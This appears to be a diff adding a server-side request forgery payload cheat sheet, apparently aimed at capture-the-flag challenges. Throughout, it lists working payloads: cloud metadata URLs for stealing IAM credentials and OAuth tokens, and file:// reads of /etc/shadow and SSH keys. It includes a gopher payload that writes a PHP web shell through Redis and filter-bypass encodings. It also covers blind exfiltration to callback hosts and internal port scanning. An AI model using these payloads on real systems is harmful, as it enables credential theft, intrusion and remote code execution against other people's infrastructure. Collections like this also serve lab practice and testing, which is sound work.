@@ -1,0 +1,265 @@
+=== BASIC DETECTION ===
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+http://YOUR-SERVER.com/ssrf-test
+
+=== LOCALHOST VARIATIONS ===
+http://127.0.0.1/
+http://localhost/
+http://127.1/
+http://127.0.1/
+http://0.0.0.0/
+http://0/
+http://[::1]/
+http://[0:0:0:0:0:0:0:1]/
+http://localhost.localdomain/
+
+=== DECIMAL/HEX/OCTAL IP ENCODING ===
+http://2130706433/  (127.0.0.1 in decimal)
+http://3232235521/  (192.168.1.1 in decimal)
+http://0x7f000001/  (127.0.0.1 in hex)
+http://0xc0a80101/  (192.168.1.1 in hex)
+http://0177.0.0.1/  (127.0.0.1 in octal)
+http://0177.1/  (127.0.0.1 in mixed)
+
+=== INTERNAL IP RANGES ===
+http://192.168.0.1/
+http://192.168.1.1/
+http://10.0.0.1/
+http://10.10.10.10/
+http://172.16.0.1/
+http://172.17.0.1/
+
+=== AWS METADATA ===
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+=== GOOGLE CLOUD METADATA (requires Metadata-Flavor: Google header) ===
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+http://metadata.google.internal/computeMetadata/v1/?recursive=true
+http://169.254.169.254/computeMetadata/v1/
+
+=== AZURE METADATA (requires Metadata: true header) ===
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+
+=== DIGITAL OCEAN METADATA ===
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+
+=== PORT SCANNING ===
+http://localhost:22/
+http://localhost:23/
+http://localhost:25/
+http://localhost:80/
+http://localhost:443/
+http://localhost:3306/  (MySQL)
+http://localhost:5432/  (PostgreSQL)
+http://localhost:6379/  (Redis)
+http://localhost:8080/
+http://localhost:9200/  (Elasticsearch)
+http://localhost:11211/  (Memcached)
+http://localhost:27017/  (MongoDB)
+http://localhost:2375/  (Docker)
+
+=== FILE PROTOCOL ===
+file:///etc/passwd
+file:///etc/hosts
+file:///etc/shadow
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///var/www/html/index.php
+file:///var/www/html/config.php
+file:///app/flag.txt
+file:///flag.txt
+file:///root/.ssh/id_rsa
+file://C:/Windows/System32/drivers/etc/hosts
+file://C:/Windows/win.ini
+
+=== GOPHER PROTOCOL (REDIS) ===
+gopher://localhost:6379/_INFO
+gopher://localhost:6379/_CONFIG:GET:dir
+gopher://localhost:6379/_GET:flag
+
+=== DICT PROTOCOL ===
+dict://localhost:6379/INFO
+dict://localhost:6379/CONFIG:GET:dir
+dict://localhost:11211/stats
+
+=== ELASTICSEARCH ===
+http://localhost:9200/
+http://localhost:9200/_cat/indices
+http://localhost:9200/_cluster/health
+http://localhost:9200/_nodes
+http://localhost:9200/_search?q=password
+http://localhost:9200/_search?q=flag
+http://localhost:9200/_all/_search
+
+=== DOCKER API ===
+http://localhost:2375/containers/json
+http://localhost:2375/images/json
+http://localhost:2375/version
+http://localhost:2376/containers/json
+
+=== MONGODB ===
+http://localhost:27017/
+http://localhost:28017/
+
+=== MEMCACHED ===
+dict://localhost:11211/stats
+gopher://localhost:11211/_stats%0aquit
+
+=== BYPASS TECHNIQUES - @ SYMBOL ===
+http://legitimate.com@127.0.0.1/
+http://legitimate.com@localhost/
+http://google.com@192.168.1.1/
+http://legitimate.com@169.254.169.254/
+
+=== BYPASS TECHNIQUES - # FRAGMENT ===
+http://127.0.0.1#legitimate.com
+http://localhost#google.com
+http://169.254.169.254#legitimate.com
+
+=== BYPASS TECHNIQUES - URL SHORTENERS ===
+http://bit.ly/YOUR-SHORTENED-URL
+http://tinyurl.com/YOUR-SHORTENED-URL
+
+=== BYPASS TECHNIQUES - DNS SERVICES ===
+http://127.0.0.1.nip.io/
+http://127.0.0.1.xip.io/
+http://7f000001.rbndr.us/
+http://spoofed.burpcollaborator.net/
+
+=== BYPASS TECHNIQUES - CASE VARIATION ===
+hTTp://127.0.0.1/
+HTtP://localhost/
+HTTP://LOCALHOST/
+
+=== BYPASS TECHNIQUES - UNICODE ===
+http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
+http://127。0。0。1/
+
+=== BYPASS TECHNIQUES - ENCLOSED ALPHANUMERICS ===
+http://①②⑦.⓪.⓪.①/
+
+=== BLIND SSRF - CALLBACK SERVERS ===
+http://YOUR-SERVER.com/
+http://YOUR-SUBDOMAIN.burpcollaborator.net/
+http://YOUR-ID.webhook.site/
+http://YOUR-ID.requestbin.com/
+
+=== BLIND SSRF - DNS EXFILTRATION ===
+http://data-here.your-domain.com/
+http://UNIQUE-ID.burpcollaborator.net/
+
+=== COMMON CTF TARGETS ===
+http://localhost/admin
+http://localhost/flag
+http://localhost:8080/flag
+http://127.0.0.1/admin
+http://127.0.0.1/secret
+file:///flag.txt
+file:///app/flag.txt
+http://169.254.169.254/latest/user-data/
+
+=== REDIS EXPLOITATION (GOPHER) ===
+# Get info
+gopher://localhost:6379/_INFO%0aquit
+
+# Get flag key
+gopher://localhost:6379/_GET%20flag%0aquit
+
+# Set value
+gopher://localhost:6379/_SET%20key%20value%0aquit
+
+# Write web shell (basic)
+gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$56%0d%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+
+=== SMTP EXPLOITATION (GOPHER) ===
+gopher://localhost:25/_HELO%20localhost%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:%20SSRF%20Test%0A%0AThis%20is%20a%20test%0A.%0AQUIT
+
+=== PATH TRAVERSAL + SSRF ===
+http://localhost/../../../etc/passwd
+file:///../../../etc/passwd
+
+=== OPEN REDIRECT CHAIN ===
+http://target.com/redirect?url=http://localhost/admin
+http://legitimate.com/redirect?to=http://169.254.169.254/
+
+=== PROTOCOL SMUGGLING ===
+http://localhost:6379/
+gopher://localhost:6379/_INFO
+dict://localhost:6379/INFO
+ldap://localhost:389/
+tftp://localhost:69/
+
+=== IPv6 VARIATIONS ===
+http://[::1]/
+http://[0:0:0:0:0:0:0:1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+http://[::ffff:127.0.0.1]/
+
+=== COMBINING TECHNIQUES ===
+http://legitimate.com@127.1/
+http://google.com@0x7f000001/
+http://localhost#@169.254.169.254/
+http://127.0.0.1.nip.io@169.254.169.254/
+
+=== CTF-SPECIFIC PAYLOADS ===
+# Flag in metadata
+http://169.254.169.254/latest/user-data/
+
+# Flag in admin panel
+http://localhost/admin/flag.txt
+http://127.0.0.1:8080/flag
+
+# Flag in Redis
+gopher://localhost:6379/_GET%20flag%0aquit
+dict://localhost:6379/GET:flag
+
+# Flag in file
+file:///flag.txt
+file:///app/flag.txt
+file:///var/www/flag.txt
+
+# Flag in environment
+file:///proc/self/environ
+
+# Docker container flag
+http://localhost:2375/containers/json
+
+=== AUTOMATION TARGETS ===
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://127.0.0.1:6379/
+http://127.0.0.1:8080/
+http://127.0.0.1:9200/
+
+=== ERROR-BASED DETECTION ===
+http://localhost:99999/  (timeout on closed port)
+http://localhost:80/  (quick response on open port)
+http://1.1.1.1:99999/  (external timeout)
+
+=== HEADERS TO ADD (IF POSSIBLE) ===
+Metadata-Flavor: Google
+Metadata: true
+X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
